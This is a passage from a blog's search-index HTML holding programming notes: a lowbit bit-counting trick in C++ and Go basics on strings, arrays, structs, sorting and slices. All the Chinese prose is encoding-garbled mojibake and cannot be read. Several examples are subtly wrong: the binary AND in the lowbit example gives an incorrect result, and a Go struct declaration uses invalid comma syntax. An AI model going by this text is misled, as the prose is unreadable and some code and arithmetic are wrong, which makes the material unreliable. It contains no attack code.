&lt;h3 id=&#34;æ±‚ä¸€ä¸ªæ•°äºŒè¿›åˆ¶è¡¨ç¤ºä¸­1çš„ä¸ªæ•°&#34;&gt;æ±‚ä¸€ä¸ªæ•°äºŒè¿›åˆ¶è¡¨ç¤ºä¸­1çš„ä¸ªæ•°&lt;/h3&gt;
&lt;p&gt;åˆ©ç”¨åˆ°äº†ä¸€ä¸ªæ•°çš„åŸç å’Œè¡¥ç ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªæ•°çš„åŸç å’Œè¡¥ç æŒ‰ä½ç›¸ä¸å¯ä»¥å¾—åˆ°è¿™ä¸ªæ•°çš„æœ€ä½ä½çš„1æ‰€è¡¨ç¤ºçš„æ•°çš„å¤§å°ï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªæ•°11000100ï¼Œé‚£ä¹ˆå…¶åç æ˜¯00111011ï¼Œè¡¥ç æ˜¯00111100ï¼Œé‚£ä¹ˆ11000100ä¸00111100ç›¸ä¸ç»“æœä¸ºï¼š00000010&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆä¸€ä¸ªæ•°çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸­1çš„ä¸ªæ•°å¯ä»¥ç”¨ä¸Šè¿°æ–¹æ³•åå¤è®¡ç®—ï¼Œæ¯æ¬¡è®¡ç®—å‡ºæ¥åå°±åœ¨åŸä¹¦çš„åŸºç¡€ä¸Šå‡å»ï¼Œç›´è‡³ä¸º0ä¸ºæ­¢ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int x;
int cnt = 0;
while(x)
{
    x -= lowbit(x);
    cnt ++;
}

int lowbit(int x)
{
    return x &amp;amp; (-x);
}

&lt;/code&gt;&lt;/pre&gt;
">ã€ç®—æ³•ã€‘ä½è¿ç®—</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/go-golang/"" data-c="
          &lt;h4 id=&#34;è¯­è¨€ç»“æ„&#34;&gt;è¯­è¨€ç»“æ„&lt;/h4&gt;
&lt;p&gt;åŒ…å£°æ˜ï¼šç¬¬ä¸€è¡Œä»£ç å¿…é¡»ä½¿ç”¨&lt;code&gt;package xxx&lt;/code&gt;æŒ‡æ˜è¯¥æ–‡ä»¶å±äºå“ªä¸ªåŒ…ã€‚&lt;/p&gt;
&lt;p&gt;å¼•å…¥åŒ…ï¼šåé¢å¯¼å…¥åŒ…ï¼Œç”¨åŒå¼•å·å¼•èµ·ã€‚&lt;/p&gt;
&lt;p&gt;å¯¼å‡ºåï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åœ¨ Go ä¸­ï¼Œå¦‚æœä¸€ä¸ªåå­—ä»¥å¤§å†™å­—æ¯å¼€å¤´ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯å·²å¯¼å‡ºçš„ã€‚ä¾‹å¦‚ï¼Œ&lt;code&gt;Pizza&lt;/code&gt; å°±æ˜¯ä¸ªå·²å¯¼å‡ºåï¼Œ&lt;code&gt;Pi&lt;/code&gt; ä¹ŸåŒæ ·ï¼Œå®ƒå¯¼å‡ºè‡ª &lt;code&gt;math&lt;/code&gt; åŒ…ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;æ‰§è¡Œgoç¨‹åº&#34;&gt;æ‰§è¡Œgoç¨‹åº&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;go run hello.go&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;è¿˜å¯ä»¥ä½¿ç”¨&lt;code&gt;go build hello.go&lt;/code&gt;ç¼–è¯‘æˆäºŒè¿›åˆ¶æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;å·¦èŠ±æ‹¬å·{ä¸èƒ½å•ç‹¬æ”¾åœ¨ä¸€è¡Œã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ•°æ®ç±»å‹&#34;&gt;æ•°æ®ç±»å‹&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;å¸ƒå°”å‹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ•°å­—ç±»å‹&lt;/p&gt;
&lt;p&gt;intã€float32ã€float64&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å­—ç¬¦ä¸²ç±»å‹&lt;/p&gt;
&lt;p&gt;å­—ç¬¦ä¸²æ˜¯ä¸å¯å˜å­—èŠ‚åºåˆ—ï¼Œå…¶æœ¬èº«æ˜¯ä¸€ä¸ªå¤åˆç»“æ„ã€‚&lt;/p&gt;
&lt;p&gt;å­—ç¬¦ä¸²é»˜è®¤å€¼ä¸æ˜¯nilè€Œæ˜¯&amp;quot;&amp;quot;ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;var str string
fmt.Println(str == &amp;quot;&amp;quot;) // true
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;[]byteå’Œ[]runeç±»å‹çš„åŒºåˆ«ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;str := &amp;quot;strings&amp;quot;
fmt.Println([]rune(str)) // [103 111 35821 35328]
fmt.Println([]byte(str)) // [103 111 232 175 173 232 168 128]
// å­—ç¬¦ä¸²æ˜¯utf-8çš„ä¸€ä¸ªåºåˆ—ï¼Œå½“å­—ç¬¦ä¸²ä¸ºASCâ…¡ç è¡¨ä¸Šçš„å­—ç¬¦åˆ™å ç”¨1ä¸ªå­—èŠ‚ï¼Œå…¶ä»–å­—ç¬¦æ ¹æ®éœ€è¦å ç”¨2-4ä¸ªå­—èŠ‚ã€‚

// å¯ä»¥çœ‹å‡ºruneçš„é•¿åº¦æ˜¯4ï¼Œbyteé•¿åº¦æ˜¯8ï¼Œè¿™æ˜¯å› ä¸ºruneæ˜¯ä½¿ç”¨utf-8ç¼–ç ï¼Œå½“å­—ç¬¦å¯ä»¥ä½¿ç”¨ASCâ…¡è¡¨ç¤ºæ—¶ï¼Œå…¶å ä¸€ä¸ªå­—èŠ‚ï¼Œå…¶ä»–å­—ç¬¦æ ¹æ®éœ€è¦å ç”¨2-4ä¸ªå­—èŠ‚ã€‚

// byteå°±æ˜¯å…·ä½“çš„å­—èŠ‚ä¸ªæ•°ï¼Œä½¿ç”¨å†…ç½®å‡½æ•°len()å¾—åˆ°çš„æ˜¯å­—ç¬¦ä¸²çš„byteé•¿åº¦ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å­—ç¬¦ä¸²çš„å†…å®¹(çº¯å­—èŠ‚)å¯ä»¥é€šè¿‡ç´¢å¼•æ¥è·å–ï¼Œå¯¹å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªutf-8å­—ç¬¦è®¿é—®å¯ä»¥é€šè¿‡runeç±»å‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;for i, ru := range str{
    // iä¸ºç´¢å¼•
    // ruä¸ºuft-8å­—ç¬¦
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é™¤äº†å¯ä»¥ä½¿ç”¨åŒå¼•å·å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨åå¼•å·``ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;str := `line 1
line 2
line 3
\r\n
`
fmt.Println(str)
/*
line 1
line 2
line 3
\r\n
*/
// å¯ä»¥çœ‹å‡ºå®ƒä¸å¯¹è½¬ç§»å­—ç¬¦è¿›è¡Œè§£æï¼Œå³æŒ‰ç…§åŸæ–‡æœ¬è¾“å‡ºã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¸¸è§çš„å­—ç¬¦ä¸²æ“ä½œï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;å­—ç¬¦ä¸²æ¯”è¾ƒ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Compare å‡½æ•°ï¼Œç”¨äºæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²çš„å¤§å°ï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ï¼Œè¿”å›ä¸º 0ã€‚å¦‚æœ a å°äº b ï¼Œè¿”å› -1 ï¼Œåä¹‹è¿”å› 1 ã€‚ä¸æ¨èä½¿ç”¨è¿™ä¸ªå‡½æ•°ï¼Œç›´æ¥ä½¿ç”¨ == != &amp;gt; &amp;lt; &amp;gt;= &amp;lt;= ç­‰ä¸€ç³»åˆ—è¿ç®—ç¬¦æ›´åŠ ç›´è§‚ã€‚
func Compare(a, b string) int 
//   EqualFold å‡½æ•°ï¼Œè®¡ç®— s ä¸ t å¿½ç•¥å­—æ¯å¤§å°å†™åæ˜¯å¦ç›¸ç­‰ã€‚
func EqualFold(s, t string) bool

a := &amp;quot;gopher&amp;quot;
b := &amp;quot;hello world&amp;quot;
fmt.Println(strings.Compare(a, b)) // -1
fmt.Println(strings.Compare(a, a)) // 0
fmt.Println(strings.Compare(b, a)) // 1
fmt.Println(strings.EqualFold(&amp;quot;GO&amp;quot;, &amp;quot;go&amp;quot;)) // true
fmt.Println(strings.EqualFold(&amp;quot;å£¹&amp;quot;, &amp;quot;ä¸€&amp;quot;)) // false
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å­ä¸²&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// å­ä¸² substr åœ¨ s ä¸­ï¼Œè¿”å› true
func Contains(s, substr string) bool
// chars ä¸­ä»»ä½•ä¸€ä¸ª Unicode ä»£ç ç‚¹åœ¨ s ä¸­ï¼Œè¿”å› true
func ContainsAny(s, chars string) bool
// Unicode ä»£ç ç‚¹ r åœ¨ s ä¸­ï¼Œè¿”å› true
func ContainsRune(s string, r rune) bool

fmt.Println(strings.ContainsAny(&amp;quot;team&amp;quot;, &amp;quot;i&amp;quot;)) // false
fmt.Println(strings.ContainsAny(&amp;quot;failure&amp;quot;, &amp;quot;u &amp;amp; i&amp;quot;)) // true
fmt.Println(strings.ContainsAny(&amp;quot;in failure&amp;quot;, &amp;quot;s g&amp;quot;)) // true
fmt.Println(strings.ContainsAny(&amp;quot;foo&amp;quot;, &amp;quot;&amp;quot;)) // false
fmt.Println(strings.ContainsAny(&amp;quot;&amp;quot;, &amp;quot;&amp;quot;)) // false

// å­ä¸²å‡ºç°å‡ æ¬¡
func Count(s, sep string) int
fmt.Println(strings.Count(&amp;quot;cheese&amp;quot;, &amp;quot;e&amp;quot;)) // 3
fmt.Println(len(&amp;quot;è°·æ­Œä¸­å›½&amp;quot;)) // 12
fmt.Println(strings.Count(&amp;quot;è°·æ­Œä¸­å›½&amp;quot;, &amp;quot;&amp;quot;)) // 5
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å­—ç¬¦ä¸²åˆ†å‰²&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func Split(s, sep string) []string

fmt.Printf(&amp;quot;%q\n&amp;quot;, strings.Split(&amp;quot;foo,bar,baz&amp;quot;, &amp;quot;,&amp;quot;))

// å¦‚æœæŒ‰ç…§ç©ºæ ¼åˆ†å¼€ï¼Œè¿™ç§æ–¹å¼ä¸ä¼šå¿½ç•¥è¿ç»­çš„ç©ºæ ¼ï¼Œè¿™ç§æƒ…å†µä½¿ç”¨strings.Fields(strings)
strings.Fields(str)
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å‰åç¼€&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// s ä¸­æ˜¯å¦ä»¥ prefix å¼€å§‹
func HasPrefix(s, prefix string) bool {
  return len(s) &amp;gt;= len(prefix) &amp;amp;&amp;amp; s[0:len(prefix)] == prefix
}
// s ä¸­æ˜¯å¦ä»¥ suffix ç»“å°¾
func HasSuffix(s, suffix string) bool {
  return len(s) &amp;gt;= len(suffix) &amp;amp;&amp;amp; s[len(s)-len(suffix):] == suffix
}

fmt.Println(strings.HasPrefix(&amp;quot;Gopher&amp;quot;, &amp;quot;&amp;quot;)) // true
fmt.Println(strings.HasSuffix(&amp;quot;Amigo&amp;quot;, &amp;quot;go&amp;quot;)) // true
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å­—ç¬¦æˆ–å­ä¸²åœ¨å­—ç¬¦ä¸²ä¸­å‡ºç°çš„ä½ç½®&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// åœ¨ s ä¸­æŸ¥æ‰¾ sep çš„ç¬¬ä¸€æ¬¡å‡ºç°ï¼Œè¿”å›ç¬¬ä¸€æ¬¡å‡ºç°çš„ç´¢å¼•
func Index(s, sep string) int
// åœ¨ s ä¸­æŸ¥æ‰¾å­—èŠ‚ c çš„ç¬¬ä¸€æ¬¡å‡ºç°ï¼Œè¿”å›ç¬¬ä¸€æ¬¡å‡ºç°çš„ç´¢å¼•
func IndexByte(s string, c byte) int
// chars ä¸­ä»»ä½•ä¸€ä¸ª Unicode ä»£ç ç‚¹åœ¨ s ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®
func IndexAny(s, chars string) int
// æŸ¥æ‰¾å­—ç¬¦ c åœ¨ s ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå…¶ä¸­ c æ»¡è¶³ f(c) è¿”å› true
func IndexFunc(s string, f func(rune) bool) int
// Unicode ä»£ç ç‚¹ r åœ¨ s ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®
func IndexRune(s string, r rune) int

han := func(c rune) bool {
    return unicode.Is(unicode.Han, c) // æ±‰å­—
}
fmt.Println(strings.IndexFunc(&amp;quot;Hello, world&amp;quot;, han)) // -1
fmt.Println(strings.IndexFunc(&amp;quot;Hello, ä¸–ç•Œ&amp;quot;, han)) // 7
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å°†å­—ç¬¦ä¸²æ•°ç»„è¿æ¥èµ·æ¥&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// func Join(a []string, sep string) string

fmt.Println(strings.Join([]string{&amp;quot;name=xxx&amp;quot;, &amp;quot;age=xx&amp;quot;}, &amp;quot;&amp;amp;&amp;quot;)) // name=xxx&amp;amp;age=xx
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å­—ç¬¦ä¸²é‡å¤å‡ æ¬¡&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func Repeat(s string, count int) string
fmt.Println(&amp;quot;ba&amp;quot; + strings.Repeat(&amp;quot;na&amp;quot;, 2)) // banana
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å­—ç¬¦æ›¿æ¢&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func Map(mapping func(rune) rune, s string) string
// Map å‡½æ•°ï¼Œå°† s çš„æ¯ä¸€ä¸ªå­—ç¬¦æŒ‰ç…§ mapping çš„è§„åˆ™åšæ˜ å°„æ›¿æ¢ï¼Œå¦‚æœ mapping è¿”å›å€¼ &amp;lt;0 ï¼Œåˆ™èˆå¼ƒè¯¥å­—ç¬¦ã€‚è¯¥æ–¹æ³•åªèƒ½å¯¹æ¯ä¸€ä¸ªå­—ç¬¦åšå¤„ç†ï¼Œä½†å¤„ç†æ–¹å¼å¾ˆçµæ´»ï¼Œå¯ä»¥æ–¹ä¾¿çš„è¿‡æ»¤ï¼Œç­›é€‰æ±‰å­—ç­‰ã€‚

mapping := func(r rune) rune {
    switch {
    case r &amp;gt;= &#39;A&#39; &amp;amp;&amp;amp; r &amp;lt;= &#39;Z&#39;: // å¤§å†™å­—æ¯è½¬å°å†™
        return r + 32
    case r &amp;gt;= &#39;a&#39; &amp;amp;&amp;amp; r &amp;lt;= &#39;z&#39;: // å°å†™å­—æ¯ä¸å¤„ç†
        return r
    case unicode.Is(unicode.Han, r): // æ±‰å­—æ¢è¡Œ
        return &#39;\n&#39;
    }
    return -1 // è¿‡æ»¤æ‰€æœ‰éå­—æ¯ã€æ±‰å­—çš„å­—ç¬¦
}
fmt.Println(strings.Map(mapping, &amp;quot;Helloä½ #ï¿¥%â€¦â€¦\nï¼ˆ&#39;World\n,å¥½Hello^(&amp;amp;(*ç•Œgopher...&amp;quot;))
/*
hello
world
hello
gopher
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å­—ç¬¦ä¸²å­ä¸²æ›¿æ¢&lt;/p&gt;
&lt;p&gt;è¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢æ—¶ï¼Œè€ƒè™‘åˆ°æ€§èƒ½é—®é¢˜ï¼Œèƒ½ä¸ç”¨æ­£åˆ™å°½é‡åˆ«ç”¨ï¼Œåº”è¯¥ç”¨è¿™é‡Œçš„å‡½æ•°ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// ç”¨ new æ›¿æ¢ s ä¸­çš„ oldï¼Œä¸€å…±æ›¿æ¢ n ä¸ªã€‚
// å¦‚æœ n &amp;lt; 0ï¼Œåˆ™ä¸é™åˆ¶æ›¿æ¢æ¬¡æ•°ï¼Œå³å…¨éƒ¨æ›¿æ¢
func Replace(s, old, new string, n int) string
// è¯¥å‡½æ•°å†…éƒ¨ç›´æ¥è°ƒç”¨äº†å‡½æ•° Replace(s, old, new , -1)
func ReplaceAll(s, old, new string) string

fmt.Println(strings.Replace(&amp;quot;oink oink oink&amp;quot;, &amp;quot;k&amp;quot;, &amp;quot;ky&amp;quot;, 2)) // oinky oinky oink
fmt.Println(strings.Replace(&amp;quot;oink oink oink&amp;quot;, &amp;quot;oink&amp;quot;, &amp;quot;moo&amp;quot;, -1)) // moo moo moo
fmt.Println(strings.ReplaceAll(&amp;quot;oink oink oink&amp;quot;, &amp;quot;oink&amp;quot;, &amp;quot;moo&amp;quot;)) // moo moo moo
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ´¾ç”Ÿç±»å‹&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;æŒ‡é’ˆç±»å‹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ•°ç»„ç±»å‹&lt;/p&gt;
&lt;p&gt;æ•°ç»„å¿…é¡»ç±»å‹å’Œé•¿åº¦ä¸€è‡´æ‰ç®—åšæ˜¯åŒä¸€ç§ç±»å‹ã€‚&lt;/p&gt;
&lt;p&gt;æ•°ç»„æ˜¯å€¼ç±»å‹çš„ï¼Œèµ‹å€¼å’Œä¼ å‚éƒ½æ˜¯å¤åˆ¶æ•´ä¸ªæ•°ç»„ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// åˆå§‹åŒ–
var a [3]int // {0,0,0}è‡ªåŠ¨åˆå§‹åŒ–ä¸º0
b := [4]int{1, 2} // {1,2,0,0}æœªåˆå§‹åŒ–çš„ä½ç½®åˆå§‹åŒ–ä¸º0
c := [4]int{1, 3:10} //{1,0,0,10}æŒ‡å®šç´¢å¼•ä½ç½®åˆå§‹åŒ–
d := [...]int{1,2,3} // ç¼–è¯‘å™¨æŒ‰ç…§åˆå§‹åŒ–æ•°é‡ç¡®å®šæ•°ç»„é•¿åº¦
// å¯¹äºç¬¦åˆç±»å‹åˆå§‹åŒ–ï¼Œå¯çœç•¥ç±»å‹æ ‡ç­¾
type user struct {
    name string,
    age byte
}
e := [...]user {
    {&amp;quot;Tom&amp;quot;, 20},
    {&amp;quot;Sam&amp;quot;, 21},
}
// äºŒç»´æ•°ç»„æ”¯æŒç¬¬ä¸€ç»´ä½¿ç”¨...
f := [...][2]int{
    {1,2},
    {3,4},
}

  // åŠ¨æ€äºŒç»´æ•°ç»„
var a [][]int
for i := 0; i &amp;lt; 10; i++ {
    var tmp []int
    for j:= 0; j &amp;lt; 10; j++ {
        tmp = append(tmp, j)
    }
    a = append(a, tmp)
}
     
row, column := 3, 4
var answer [][]int
for i := 0; i &amp;lt; row; i++ {
    inline := make([]int, column)
    answer = append(answer, inline)
}
// ç”¨åˆ‡ç‰‡åˆ›å»º
answer1 := make([][]int, row)
for i := range answer1 {
    answer1[i] = make([]int, column)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;â€‹&lt;/p&gt;
&lt;p&gt;â€‹&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ç»“æ„åŒ–ç±»å‹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Channelç±»å‹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å‡½æ•°ç±»å‹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åˆ‡ç‰‡ç±»å‹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ¥å£ç±»å‹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Mapç±»å‹&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ•°æ®ç±»å‹è½¬åŒ–ï¼š&lt;code&gt;float64(num)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å¸¸é‡ä¹Ÿæ˜¯å‰é¢åŠ constï¼Œä¸”ä¸èƒ½ç”¨&lt;code&gt;:=&lt;/code&gt;å®šä¹‰&lt;/p&gt;
&lt;h3 id=&#34;æ•°æ®å®šä¹‰&#34;&gt;æ•°æ®å®šä¹‰&lt;/h3&gt;
&lt;p&gt;å‡½æ•°ä»¥å¤–çš„è¯­å¥éƒ½å¿…é¡»ä»¥å…³é”®å­—å¼€å§‹ï¼Œä¾‹å¦‚varã€funcç­‰ï¼Œå› æ­¤&lt;code&gt;:=&lt;/code&gt;åªèƒ½åœ¨å‡½æ•°å†…ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;æ²¡æœ‰åˆå§‹åŒ–çš„å˜é‡ä¼šè¢«èµ‹äºˆé›¶å€¼ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ•°å€¼ç±»å‹ä¸º0&lt;/li&gt;
&lt;li&gt;å¸ƒå°”ç±»å‹ä¸ºfalse&lt;/li&gt;
&lt;li&gt;å­—ç¬¦ä¸²ä¸º&amp;quot;&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ç»“æ„ä½“&#34;&gt;ç»“æ„ä½“&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type struct_name struct {
    v1 string
    v2 string
    v3 int
}

v := struct_name {v1, v2, ..., vn}
v := struct_name {key1: v1, key2:v2, ..., keyn:vn}
v.v1 = &amp;quot;...&amp;quot;

// æŒ‡é’ˆ
sp := &amp;amp;v
sp.v1 = &amp;quot;...&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;ç»“æ„ä½“æ’åº&#34;&gt;ç»“æ„ä½“æ’åº&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// æ’åºç”¨åˆ°äº†sortåŒ…
import &amp;quot;sort&amp;quot;

// å¸¸è§çš„ä¸‰ç§æ’åºå‡½æ•° sort.Ints sort.Floats sort.Stringsæ˜¯å¯¹äº[]int []float []string

// ä½¿ç”¨è‡ªå®šä¹‰æ’åºå‡½æ•° sort.Sliceå’Œsort.SliceStableï¼Œåè€…æ˜¯ç¨³å®šæ’åºï¼ŒåŒ…å«ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯å¾…æ’åºçš„æ•°ç»„ï¼Œç¬¬äºŒä¸ªæ˜¯æ’åºå‡½æ•°ï¼Œç¤ºä¾‹ï¼š

family := []struct {
    Name string
    Age  int
}{
    {&amp;quot;Alice&amp;quot;, 23},
    {&amp;quot;David&amp;quot;, 2},
    {&amp;quot;Eve&amp;quot;, 2},
    {&amp;quot;Bob&amp;quot;, 25},
}
sort.SliceStable(family, func(i, j int) bool {
    return family[i].Age &amp;lt; family[j].Age
}) // æŒ‰ç…§å¹´é¾„æ’åº


sort.SliceStable(family, func(i, j int) bool {
    if family[i].Age != family[j].Age {
        return family[i].Age &amp;lt; family[j].Age
    }
    return strings.Compare(family[i].Name, family[j].Name) == 1
})// é¦–å…ˆæŒ‰ç…§å¹´é¾„æ’åºï¼Œç„¶åæŒ‰ç…§åå­—æ’åº
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;è¯­è¨€åˆ‡ç‰‡&#34;&gt;è¯­è¨€åˆ‡ç‰‡&lt;/h3&gt;
&lt;p&gt;åˆ‡ç‰‡æœ¬èº«å¹¶éåŠ¨æ€æ•°ç»„æˆ–æ•°ç»„æŒ‡é’ˆã€‚å®ƒå†…éƒ¨é€šè¿‡æŒ‡é’ˆå¼•ç”¨åº•å±‚æ•°ç»„ï¼Œè®¾å®šç›¸å…³å±æ€§å°†æ•°æ®è¯»å†™é™å®šåœ¨æŒ‡å®šåŒºåŸŸå†…ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;x := [...]int{0,1,2,3,4,5,6,7,8,9}
// åˆ‡ç‰‡æ“ä½œ
/*	expression	slice					len	cap
	x[:]		[0,1,2,3,4,5,6,7,8,9]	10	10
	x[2:5]		[2,3,4]					3	8
	x[2:5:7]	[2,3,4]					3	5
	x[4:]		[4,5,6,7,8,9]			6	6
	x[:4]		[0,1,2,3]				4	10
	x[:4:6]		[0,1,2,3]				4	6
å±æ€§capè¡¨ç¤ºåˆ‡ç‰‡æ‰€å¼•ç”¨æ•°ç»„ç‰‡æ®µçš„çœŸå®é•¿åº¦ï¼Œlenç”¨äºé™å®šå¯è¯»å†™çš„å†™å…ƒç´ æ•°é‡ã€‚
*/

// åˆ›å»ºåˆ‡ç‰‡å¯¹è±¡ï¼Œå¼•ç”¨ç±»å‹ï¼Œé¡»ä½¿ç”¨makeå‡½æ•°æˆ–æ˜¾å¼åˆå§‹åŒ–è¯­å¥
s1 := make([]int, 3, 5) // æŒ‡å®šlenã€capï¼Œåº•å±‚æ•°ç»„åˆå§‹åŒ–ä¸º0
s2 := make([]int, 3) // ä¸æŒ‡å®šcapï¼Œå’Œlenç›¸ç­‰

// å¯ä»¥åŸºäºä¸€ä¸ªåˆ‡ç‰‡åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ‡ç‰‡ï¼ŒäºŒè€…éƒ½æŒ‡å‘åŒä¸€ä¸ªåº•å±‚æ•°ç»„ï¼Œç§°ä¸ºreslice
d := [...]int{0,1,2,3,4,5}
d1 := d[2:5]
d2 := d1[0:2]
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/* makeå‚æ•°

make(type, len, cap)
type: åˆ‡ç‰‡ç±»å‹
len: åˆ‡ç‰‡é•¿åº¦
cap: åˆ‡ç‰‡å®¹é‡

*/
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// ç”¨resliceå®ç°æ ˆ
stack := make([]int, 0, 5)

push := func(x int) error {
    n := len(stack)
    if n == cap(stack) {
        return errors.New(&amp;quot;stack is full&amp;quot;)
    }
    stack = stack[:n+1]
    stack[n] = x
    
    return nil
}

pop := func() (int, error) {
    n := len(stack)
    if n == 0 {
        return 0, errors.New(&amp;quot;stack is empty&amp;quot;)
    }
    
    x := stack[n-1]
    stack = stack[:n-1]
    
    return x, nil
}

for i := 0; i &amp;lt; 7; i++ {
    fmt.Printf(&amp;quot;push %d: %v, %v\n&amp;quot;, i, push(i), stack)
}

for i := 0; i &amp;lt; 7; i++ {
    x, err := pop()
    fmt.Printf(&amp;quot;pop %d, %v, %v\n&amp;quot;, x, err, stack)
}

/*
push 0: &amp;lt;nil&amp;gt;, [0]
push 1: &amp;lt;nil&amp;gt;, [0 1]
push 2: &amp;lt;nil&amp;gt;, [0 1 2]
push 3: &amp;lt;nil&amp;gt;, [0 1 2 3]
push 4: &amp;lt;nil&amp;gt;, [0 1 2 3 4]
push 5: stack is full, [0 1 2 3 4]
push 6: stack is full, [0 1 2 3 4]
pop 4, &amp;lt;nil&amp;gt;, [0 1 2 3]
pop 3, &amp;lt;nil&amp;gt;, [0 1 2]
pop 2, &amp;lt;nil&amp;gt;, [0 1]
pop 1, &amp;lt;nil&amp;gt;, [0]
pop 0, &amp;lt;nil&amp;gt;, []
pop 0, stack is empty, []
pop 0, stack is empty, []
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// append å‘åˆ‡ç‰‡å°¾éƒ¨æ·»åŠ æ•°æ®ï¼Œå¦‚æœè¶…å‡ºcapåˆ™é‡æ–°åˆ†é…æ•°ç»„
// é‡æ–°åˆ†é…çš„æ•°æ®çš„capæ˜¯åŸæ¥æ•°ç»„capçš„äºŒå€ï¼Œä½†å¹¶ééƒ½æ˜¯2å€
s := make([]int, 0, 100)
